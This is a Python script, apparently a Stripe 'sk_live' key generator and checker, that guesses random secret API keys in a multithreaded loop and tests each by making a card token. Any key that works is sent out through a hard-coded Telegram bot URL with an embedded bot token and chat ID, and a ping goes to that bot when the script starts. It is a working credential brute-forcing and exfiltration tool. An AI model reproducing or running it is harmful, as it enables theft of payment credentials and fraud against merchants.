#Importing modules
import stripe
import random, string
from requests import get
import concurrent.futures
print("""
.d8888.  .o88b. d888888b d88888b d888888b d8888b. d88888b .88b  d88.  .d88b.  d8b   db 
88'  YP d8P  Y8   `88'   88'       `88'   88  `8D 88'     88'YbdP`88 .8P  Y8. 888o  88 
`8bo.   8P         88    88ooo      88    88   88 88ooooo 88  88  88 88    88 88V8o 88 
  `Y8b. 8b         88    88~~~      88    88   88 88~~~~~ 88  88  88 88    88 88 V8o88 
db   8D Y8b  d8   .88.   88        .88.   88  .8D 88.     88  88  88 `8b  d8' 88  V888 
`8888Y'  `Y88P' Y888888P YP      Y888888P Y8888D' Y88888P YP  YP  YP  `Y88P'  VP   V8P 


                                                        -sk live gen+checker by @scifidemon
""")
#Sender module
def notip():
    URL = f"http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text=HeheMantap"
    get(URL)
notip()
def send(key):
    URL = f"http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text={key}"
    get(URL)

#Checker module
def checker(key):
  try:
    stripe.api_key = key
    stripe.Token.create(
      card={
        "number": "4040404040404044",
        "exp_month": 10,
        "exp_year": 2025,
        "cvc": "343",
      },
    )
  except (stripe.error.AuthenticationError,stripe.error.InvalidRequestError):
    print(f'DEAD: {key}')
  except (stripe.error.CardError):
    print(f'LIVE: {key}')
    send(key)


#User Prompt
thr = int(input("Enter the number of threads: "))

while True:
  #Generating SK and assigning
  keys = []
  for _ in range(thr):
    x = ''.join(random.choices(string.ascii_letters+string.digits,k=24))
    key = f"sk_live_{x}"
    keys.append(key)

  #Multithreading
  with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(checker,keys)
                
